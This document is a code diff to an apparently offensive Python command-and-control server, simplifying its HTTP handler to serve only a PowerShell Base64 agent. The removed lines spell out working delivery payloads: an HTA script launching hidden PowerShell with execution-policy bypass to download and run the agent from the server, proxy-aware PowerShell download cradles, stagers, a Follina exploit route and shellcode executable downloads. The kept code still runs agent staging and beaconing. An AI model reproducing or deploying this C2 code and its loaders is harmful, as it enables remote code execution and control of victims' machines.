@@ -9,6 +9,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     """
     Custom HTTP request handler for C2 communications
     Handles client check-ins, commands, and file transfers with encryption
+    Simplified to support only PowerShell Base64 agent
     """
     
     def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name):
@@ -28,24 +29,13 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         # Route requests to appropriate handlers
         handlers = {
             "/raw_agent": self.send_agent_response,
-            "/hta_agent": self.send_hta_response,
-            "/hjf_agent": self.send_hjf_response,
-            "/hjfs_agent": self.send_hjfs_response,
             "/b64_stager": self.send_b64_stager_response,
-            "/b52_stager": self.send_b52_stager_response,
-            "/b52_agent": self.send_b52_agent_response,
-            "/follina_url": self.send_follina_response,
             "/beacon": self.handle_beacon
         }
         
         # Check for specific handlers
         if self.path in handlers:
             handlers[self.path]()
-        # Special case for binary downloads
-        elif self.path.startswith("/shellcode_x64.exe"):
-            self.send_shellcode_x64_exe()
-        elif self.path.startswith("/shellcode_x86.exe"):
-            self.send_shellcode_x86_exe()
         else:
             # Default response for unmatched paths
             self.send_response(200)
@@ -165,50 +155,6 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(agent_code.encode("utf-8"))
 
-    def send_hta_response(self):
-        """Send an HTA loader that will download and execute the PowerShell agent"""
-        hta_code = """
-<script>
-    new ActiveXObject("WScript.Shell").Run("powershell -w hidden -nop -ep bypass -c \\"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/raw_agent')\\"");
-    window.close();
-</script>
-"""
-        hta_code = hta_code.replace("{ip}", self.server.server_address[0]).replace("{port}", str(self.server.server_address[1]))
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-        self.wfile.write(hta_code.encode("utf-8"))
-
-    def send_hjf_response(self):
-        """Send a simple PowerShell loader that will download and execute the agent"""
-        hjf_code = """
-$V=new-object net.webclient;
-$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
-$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
-$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
-IEX($s)
-"""
-        hjf_code = hjf_code.replace("{ip}", self.server.server_address[0]).replace("{port}", str(self.server.server_address[1]))
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(hjf_code.encode("utf-8"))
-
-    def send_hjfs_response(self):
-        """Send PowerShell loader with system proxy support"""
-        hjfs_code = """
-$V=new-object net.webclient;
-$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
-$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
-$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
-IEX($s)
-"""
-        hjfs_code = hjfs_code.replace("{ip}", self.server.server_address[0]).replace("{port}", str(self.server.server_address[1]))
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(hjfs_code.encode("utf-8"))
-    
     def send_b64_stager_response(self):
         """Send a Base64 encoded stager that will download and execute the agent"""
         raw_agent = "/raw_agent"
@@ -217,88 +163,6 @@ IEX($s)
         self.send_header("Content-type", "text/plain")
         self.end_headers()
         self.wfile.write(stager_code.encode("utf-8"))
-    
-    def send_b52_stager_response(self):
-        """Send a Base52 encoded stager that will download and execute the agent"""
-        b52_agent = "/b52_agent"
-        stager_code = f"IEX((New-Object Net.WebClient).DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{b52_agent}'))"
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(stager_code.encode("utf-8"))
-
-    def send_b52_agent_response(self):
-        """Send Base52 encoded agent"""
-        raw_agent = "/raw_agent"
-        agent_code = f"IEX((New-Object Net.WebClient).DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{raw_agent}'))"
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(agent_code.encode("utf-8"))
-
-    def send_follina_response(self):
-        """Send Follina exploit HTML"""
-        # Read the content of follina.html
-        campaign_name = self._get_campaign_name()
-        if not campaign_name:
-            self.send_error(404, "Campaign not found")
-            return
-            
-        campaign_folder = campaign_name + "_campaign"
-        agents_folder = os.path.join(campaign_folder, "agents")
-        file_path = os.path.join(agents_folder, "follina.html")
-
-        if os.path.exists(file_path):
-            with open(file_path, 'r') as file:
-                follina_content = file.read()
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(follina_content.encode("utf-8"))
-        else:
-            self.send_error(404, "Follina HTML file not found.")
-
-    def send_shellcode_x64_exe(self):
-        """Send the x64 shellcode executable"""
-        campaign_name = self._get_campaign_name()
-        if not campaign_name:
-            self.send_error(404, "Campaign not found")
-            return
-            
-        agents_folder = os.path.join(campaign_name + "_campaign", "agents")
-        file_path = os.path.join(agents_folder, "shellcode_x64.exe")
-        
-        if os.path.exists(file_path):
-            self.send_response(200)
-            self.send_header("Content-type", "application/octet-stream")
-            self.send_header("Content-Disposition", "attachment; filename=shellcode_x64.exe")
-            self.end_headers()
-            
-            with open(file_path, "rb") as f:
-                self.wfile.write(f.read())
-        else:
-            self.send_error(404, "Shellcode executable not found")
-    
-    def send_shellcode_x86_exe(self):
-        """Send the x86 shellcode executable"""
-        campaign_name = self._get_campaign_name()
-        if not campaign_name:
-            self.send_error(404, "Campaign not found")
-            return
-            
-        agents_folder = os.path.join(campaign_name + "_campaign", "agents")
-        file_path = os.path.join(agents_folder, "shellcode_x86.exe")
-        
-        if os.path.exists(file_path):
-            self.send_response(200)
-            self.send_header("Content-type", "application/octet-stream")
-            self.send_header("Content-Disposition", "attachment; filename=shellcode_x86.exe")
-            self.end_headers()
-            
-            with open(file_path, "rb") as f:
-                self.wfile.write(f.read())
-        else:
-            self.send_error(404, "Shellcode executable not found")
 
     def do_POST(self):
         """Handle POST requests for command results and file uploads"""
